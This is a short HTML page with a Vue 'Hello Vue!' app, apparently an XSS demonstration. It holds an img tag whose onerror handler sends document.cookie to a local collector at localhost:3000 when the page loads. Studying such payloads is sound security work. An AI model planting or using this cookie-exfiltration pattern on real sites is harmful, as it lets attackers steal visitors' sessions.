<html>
  <script src="https://cdn.jsdelivr.net/npm/vue"></script>
  
  <body>
      <div id="app">
        {{ message }}
        <img src='x' onerror=this.src='http://localhost:3000/api/image?c='+document.cookie width="10" height="10"  >
      </div>
      <script>
          var app = new Vue({
            el: '#app',
            data: {
              message: 'Hello Vue!'
            }
          })
        </script>
  </body>
</html>
